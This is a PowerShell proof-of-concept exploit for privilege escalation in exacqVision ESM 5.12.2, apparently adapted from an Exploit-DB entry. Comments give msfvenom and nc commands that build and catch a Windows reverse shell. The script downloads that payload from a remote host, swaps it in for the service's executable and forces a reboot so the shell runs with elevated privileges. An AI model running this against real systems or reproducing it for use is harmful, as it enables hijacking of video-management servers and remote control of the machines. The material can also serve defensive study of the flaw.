### exacqVision ESM 5.12.2 - Privilege Escalation ###
# Original exploit link
# https://www.exploit-db.com/exploits/46370
# Exploit Discovery: bzyo
# POC Author: jakesss

# On kali
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.163 LPORT=443 -f exe > enterprisesystemmanager.exe
# nc -lvnp 443
# Open a new terminal in the directory that contains the msfvenom payload
# python3 -m http.server 443

# Be sure you can write in the directory you run this script in
# i.e echo "" > test.txt
# if test.txt exists in the directory, you have write permissions

Write-Output "Starting malicious payload download..."
$url = "http://10.1.1.246:443/enterprisesystemmanager.exe"
$output = ".\enterprisesystemmanager.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Write-Output "Download Complete"

Write-Output "Making backup of enterprisesystemmanger.exe..."
Rename-Item -Path "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" -NewName "enterprisesystemmanager.bak"

Write-Output "Copying over our malicious payload"
Move-Item -Path .\enterprisesystemmanager.exe -Destination C:\exacqVisionEsm\EnterpriseSystemManager

Write-Output "Restarting the computer in 10 seconds. The shell may take several minutes to catch, depending on the services start-type"
shutdown.exe /r /t 10
